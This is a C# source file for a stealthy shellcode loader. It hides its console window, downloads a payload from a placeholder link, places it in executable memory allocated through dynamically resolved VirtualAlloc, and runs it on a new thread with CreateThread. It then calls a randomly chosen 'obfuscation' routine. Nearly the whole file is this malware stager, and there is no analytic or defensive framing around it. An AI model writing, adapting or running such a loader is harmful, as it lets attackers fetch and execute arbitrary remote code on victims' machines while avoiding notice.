using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Reflection;

class StealthProgram
{
    static void Main(string[] args)
    {

        IntPtr handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        byte[] shellcode = DownloadPayload("[DOWNLOAD_LINK]");

        IntPtr memoryAddress = AllocateMemory(shellcode.Length);
        Marshal.Copy(shellcode, 0, memoryAddress, shellcode.Length);


        IntPtr threadHandle = ExecutePayload(memoryAddress);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);

        
        ObfuscateExecutionFlow();
    }

    static byte[] DownloadPayload(string url)
    {
        using (WebClient webClient = new WebClient())
        {
            return webClient.DownloadData(url);
        }
    }

    static IntPtr AllocateMemory(int size)
    {
        IntPtr kernel32 = LoadLibrary("kernel32.dll");
        IntPtr virtualAllocAddress = GetProcAddress(kernel32, "VirtualAlloc");
        VirtualAllocDelegate virtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(virtualAllocAddress, typeof(VirtualAllocDelegate));
        return virtualAlloc(IntPtr.Zero, (uint)size, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
    }

    static IntPtr ExecutePayload(IntPtr memoryAddress)
    {
        IntPtr createThreadAddress = GetProcAddress(LoadLibrary("kernel32.dll"), "CreateThread");
        CreateThreadDelegate createThread = (CreateThreadDelegate)Marshal.GetDelegateForFunctionPointer(createThreadAddress, typeof(CreateThreadDelegate));
        return createThread(IntPtr.Zero, 0, memoryAddress, IntPtr.Zero, 0, IntPtr.Zero);
    }

    static void ObfuscateExecutionFlow()
    {
        MethodInfo[] methods = typeof(ObfuscationActions).GetMethods(BindingFlags.Public | BindingFlags.Static);
        Random random = new Random();
        int index = random.Next(methods.Length);
        methods[index].Invoke(null, null);
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private const int SW_HIDE = 0;

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr LoadLibrary(string dllName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

    private delegate IntPtr CreateThreadDelegate(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [Flags]
    enum AllocationType
    {
        Commit = 0x1000,
        Reserve = 0x2000
    }

    [Flags]
    enum MemoryProtection
    {
        ExecuteReadWrite = 0x40
    }
}

class ObfuscationActions
{
    public static void ActionOne()
    {
        Console.WriteLine("Executing obfuscation action one.");
    }

    public static void ActionTwo()
    {
        Console.WriteLine("Executing obfuscation action two.");
    }

    public static void ActionThree()
    {
        Console.WriteLine("Executing obfuscation action three.");
    }
}
